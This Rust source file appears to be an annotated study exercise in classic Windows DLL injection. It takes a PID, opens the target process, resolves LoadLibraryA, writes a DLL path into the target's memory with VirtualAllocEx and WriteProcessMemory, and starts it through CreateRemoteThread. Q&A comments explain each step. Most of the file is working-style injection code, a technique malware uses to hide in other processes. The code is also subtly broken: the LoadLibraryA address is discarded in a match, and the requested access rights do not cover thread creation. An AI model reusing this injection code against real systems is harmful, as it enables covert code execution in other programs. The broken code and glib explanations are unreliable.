use std::ffi::c_void;
use std::io;
use windows::Win32::System::Threading::{CreateRemoteThread, CreateThread, OpenProcess, PROCESS_ALL_ACCESS, PROCESS_VM_OPERATION, PROCESS_VM_WRITE};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::core::s;
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};

fn main() {
    // get the pid from the user:
    let mut pid = String::new();
    io::stdin().read_line(&mut pid).expect("Failed to read line");
    let pid: u32 = pid.trim().parse().expect("Please type a number!");

    // after the pid is takes we need to get the handle of the process whose pid is taken:
    //[Explain] why unsafe is used ?
    /*
------------------------------------------------------------------------------------------------------------
In Rust, unsafe is required whenever operations could potentially violate memory safety rules, often when interfacing with C or system-level code. unsafe allows calling functions like OpenProcess, which is part of the Windows API and assumes control over raw pointers and external resources, thus circumventing Rust's usual safety guarantees. This lets Rust perform tasks at a low level but relies on the developer to ensure safety.
    */


    // [Explain] OpenProcess Windows api
    /*
OpenProcess is a Windows API function that opens an existing process and returns a handle to it, allowing further interactions like memory allocation or thread creation. Here, the permissions PROCESS_VM_OPERATION and PROCESS_VM_WRITE are specified:

PROCESS_VM_OPERATION: Grants the ability to perform memory-related operations on the target process, such as VirtualAllocEx.
PROCESS_VM_WRITE: Grants permission to write memory in the process, allowing injection of data, like a DLL path.

    */
    // [Explain] Virtual memory and what are these rights -> operation and write
/*
Virtual memory is a memory management technique where each process has its own memory space, which is isolated from others. Access rights like PROCESS_VM_OPERATION and PROCESS_VM_WRITE are necessary to safely perform memory operations within the target process, preventing unintended access violations or privilege issues.
*/
    let h_process = unsafe {
        OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE, false, pid)
    };
    let h_process = match h_process {
        Ok(h) => {
            println!("[+] Successfully retrived the process handle: {:?}",h);
            h
        },
        Err(e) => panic!("[+] Error getting handle: {:?}",e),
    };

    // [Explain] Why do we need to get the handle of kernel32.dll when LoadLibraryA function isn't even defined in kernel32?
/*
kernel32.dll is a core Windows system library where LoadLibraryA is implemented, even if the program doesn’t explicitly define it. LoadLibraryA is used to load DLLs into memory, so getting a handle to kernel32.dll provides access to this function’s location, allowing the code to locate LoadLibraryA for injection.
*/

    // [Explain] Is there another way rather than using this "s!"? -> and what's the benefit of s!
    /*
The s! macro is a Windows crate shorthand for creating PCSTR (a pointer to a C-style string in Windows), which makes it compatible with Windows APIs expecting these pointer types. Without s!, you’d need to convert Rust strings into PCSTR manually, which adds more code and complexity. s! offers a more ergonomic approach for Rust-Windows API interoperability
    */
    let h_kernel = unsafe {
        GetModuleHandleA(s!("kernel32.dll"))
    };
    let h_kernel = match h_kernel {
        Ok(h) => {
            println!("[+] Successfully got the handle of the kernel32.dll: {:?} [+]",h);
            h
        },
        Err(e) => panic!("[+] Error getting the kernel32.dll: {:?}",e),
    };
    // [Explain] What is LoadLibrary?
/*
LoadLibraryA loads a DLL into a process’s address space. In process injection, LoadLibraryA is used because it allows the target process to load the specified DLL, effectively injecting code that can execute within the target’s memory space
*/
    // [Explain] How do we got the address of LoadLibraryA from the kernel32.dll's handle?
/*
GetProcAddress is used here to retrieve the address of LoadLibraryA from kernel32.dll. This function allows dynamic retrieval of function pointers, which is crucial for injection since it provides the exact memory address to call LoadLibraryA in the target process
*/
    // [Explain] Why do we need the function pointer to the LoadLibrary?
/*
The pointer to LoadLibraryA is needed to instruct the target process to load the DLL. By calling this pointer within the target process, it indirectly invokes the function as if it were called directly within the target, achieving code execution.
*/
    // [Explain] Can't we use another technique instead of LoadLibrary?
/*

APCQueue

*/
    let loadlibrary_fn_addresss = unsafe {
        GetProcAddress(h_kernel,s!("LoadLibraryA"))
    };

    let loadlibrary_fn_address = match loadlibrary_fn_addresss {
        None => panic!("[-] Could not resolve the address of LoadLibraryA [-]"),
        Some(address) => {
            let address = address as *const ();
            println!("[+] LoadLibraryA was loaded successfully!, address: {:p}",address);
        }
    };
    // The path to the dll we need to inject
    // [Explain] What is a loader lock , and will this code be interrupted by the loader lock?
/*
The loader lock is a critical section lock in Windows that protects the loading and unloading of DLLs. Code running within DllMain should avoid making system calls or creating threads since they can trigger a deadlock if they wait on loader-related resources. This code shouldn’t experience issues with loader lock because it uses CreateRemoteThread outside of DllMain, ensuring that the DLL loading happens asynchronously.
*/
    let path_to_dll = "";
    let remote_buffer_base_address = unsafe {
        VirtualAllocEx(h_process,None,size_of_val(path_to_dll),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)
    };

    if remote_buffer_base_address.is_null() {
        panic!("[-] Could not allocate memory for remote buffer base address.");
    }

    println!("Remote Buffer Base Address: {:?}",remote_buffer_base_address);
    // We then write to buffer:

    let mut bytes_written: usize = 0;
    let buff_result = unsafe {
        WriteProcessMemory(h_process,remote_buffer_base_address,path_to_dll.as_ptr() as *const c_void,size_of_val(path_to_dll),Some(&mut bytes_written as *mut usize))
    };

    match buff_result {
        Ok(bytes_written) => {
           println!("Bytes written: {:?}",bytes_written);
        }
        Err(e) => panic!("[-] Error getting bytes written: {:?}",e),
    };
    println!("[+] Processed Process: {:?}",h_process);


    let loadlibrary_fn_address: Option<unsafe extern "system" fn(*mut c_void) -> u32> = Some(
        unsafe {
            std::mem::transmute(loadlibrary_fn_address)
        }
    );

    let mut thread:u32 = 0;
    // now we create a thread
    let h_thread = unsafe {
        CreateRemoteThread(h_process,None,0,loadlibrary_fn_address,Some(remote_buffer_base_address),0,Some(&mut thread as *mut u32))
    };

    match h_thread {
        Ok(h) => {
            println!("[+] Successfully created remote thread: {:?}",h);
        }
        Err(e) => panic!("[-] Error creating remote thread: {:?}",e),
    }

}